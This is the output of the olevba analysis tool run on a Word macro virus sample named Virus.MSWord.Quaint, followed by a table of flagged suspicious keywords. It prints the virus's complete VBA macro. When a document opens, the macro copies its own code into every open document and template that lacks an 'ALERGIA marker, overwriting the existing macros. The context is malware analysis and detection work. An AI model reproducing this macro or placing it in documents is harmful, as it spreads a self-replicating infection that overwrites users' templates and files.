olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quaint-89aa29c500dffd1ac174c82643d8b2dab2be3bba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quaint-89aa29c500dffd1ac174c82643d8b2dab2be3bba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Quaint-89aa29c500dffd1ac174c82643d8b2dab2be3bba - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Const JEDAN = 2 - 1
ASD987 = Templates.Count
ASD654 = Strings.LTrim(ThisDocument.VBProject.VBCOMPONENTS(JEDAN) _
.CODEMODULE.LINES(JEDAN, ThisDocument.VBProject.VBCOMPONENTS(JEDAN) _
.CODEMODULE.COUNTOFLINES))
For a = 1 To ASD987
   With Templates(a).VBProject.VBCOMPONENTS(JEDAN).CODEMODULE
        If .LINES(JEDAN, 27) <> "'ALERGIA" Then
             .DELETELINES JEDAN, .COUNTOFLINES: .ADDFROMSTRING ASD654
        End If
   End With
Next a
For b = 1 To Documents.Count
    With Documents(b).VBProject.VBCOMPONENTS(JEDAN).CODEMODULE
        If .LINES(JEDAN, 27) <> "'ALERGIA" Then
             .DELETELINES JEDAN, .COUNTOFLINES: .ADDFROMSTRING ASD654
        End If
    End With
Next b
End Sub
'ALERGIA




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFROMSTRING       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

